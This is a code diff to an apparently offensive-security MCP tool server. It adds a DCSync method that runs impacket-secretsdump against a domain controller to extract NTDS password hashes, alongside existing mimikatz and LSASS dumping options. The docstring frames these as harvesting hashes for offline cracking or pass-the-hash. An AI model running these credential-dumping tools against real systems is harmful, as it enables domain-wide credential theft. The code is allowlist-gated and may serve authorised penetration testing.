@@ -240,8 +240,8 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
 
     @mcp.tool()
     @require_allowlist()
-    def dump_credentials(target_ip: str, method: str = "sam", username: str = "", password: str = "", ntlm_hash: str = "", domain: str = "", output_file: str = "") -> str:
-        """Dump credentials from a target using secretsdump, mimikatz, or local SAM/LSASS extraction. Methods: secretsdump (remote via impacket), sam_local (local registry hives), mimikatz (if binary available), lsass (procdump + mimikatz). Use after gaining admin access to harvest hashes for offline cracking or pass-the-hash."""
+    def dump_credentials(target_ip: str, method: str = "sam", username: str = "", password: str = "", ntlm_hash: str = "", domain: str = "", output_file: str = "", target_user: str = "") -> str:
+        """Dump credentials from a target using secretsdump, mimikatz, or local SAM/LSASS extraction. Methods: secretsdump (remote via impacket), sam_local (local registry hives), mimikatz (if binary available), lsass (procdump + mimikatz), dcsync (impacket-secretsdump over DRSUAPI against a domain controller -- requires an account with DS-Replication-Get-Changes privileges; target_ip must be the DC; optional target_user dumps a single account). Use after gaining admin access to harvest hashes for offline cracking or pass-the-hash."""
         if not target_ip or not target_ip.strip():
             return "BLOCKED: target_ip is required."
         if not validate_ipv4(target_ip):
@@ -250,7 +250,7 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
             return "BLOCKED: method is required."
 
         m = method.strip().lower()
-        allowed_methods = {"secretsdump", "sam_local", "mimikatz", "lsass"}
+        allowed_methods = {"secretsdump", "sam_local", "mimikatz", "lsass", "dcsync"}
         if m not in allowed_methods:
             return f"BLOCKED: unsupported method '{m}'. Allowed: {', '.join(allowed_methods)}"
 
@@ -292,6 +292,57 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
             except subprocess.TimeoutExpired:
                 status = "timed_out"
                 output = "secretsdump timed out after 300s"
+                returncode = None
+            except Exception as exc:
+                status = "error"
+                output = str(exc)
+                returncode = None
+
+        elif m == "dcsync":
+            # DCSync via impacket-secretsdump over DRSUAPI against a domain
+            # controller. target_ip MUST be the DC (already allowlist-gated by
+            # @require_allowlist); the caller needs an account with
+            # DS-Replication-Get-Changes / Get-Changes-All privileges. -just-dc
+            # pulls NTDS hashes only (no plaintext/LM history); -just-dc-user
+            # optionally scopes to one account. Output goes to attempt_dir.
+            if not username.strip():
+                return "BLOCKED: username is required for dcsync."
+            has_secret = bool(password.strip()) or bool(ntlm_hash.strip())
+            if not has_secret:
+                return "BLOCKED: either password or ntlm_hash must be provided for dcsync."
+
+            d = domain.strip()
+            target = f"{d}/" if d else ""
+            target += f"{username.strip()}"
+            if password.strip():
+                target += f":{password.strip()}"
+            target += f"@{target_ip}"
+
+            # H1: argv list (no shell) so password/domain/username are literal
+            # arguments and cannot inject into a shell string.
+            argv = ["impacket-secretsdump", target]
+            if ntlm_hash.strip():
+                h = ntlm_hash.strip()
+                argv.extend(["-hashes", f":{h.split(':')[-1]}"])
+            argv.append("-just-dc")
+            tu = target_user.strip()
+            if tu:
+                argv.extend(["-just-dc-user", tu])
+            argv.extend(["-outputfile", str(attempt_dir / "ntds_hashes")])
+
+            try:
+                returncode, out, err = _run_with_pgrp_timeout(
+                    argv,
+                    300,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                )
+                output = (out + "\n" + err)[-4000:]
+                status = "completed" if returncode == 0 else "failed"
+            except subprocess.TimeoutExpired:
+                status = "timed_out"
+                output = "dcsync timed out after 300s"
                 returncode = None
             except Exception as exc:
                 status = "error"
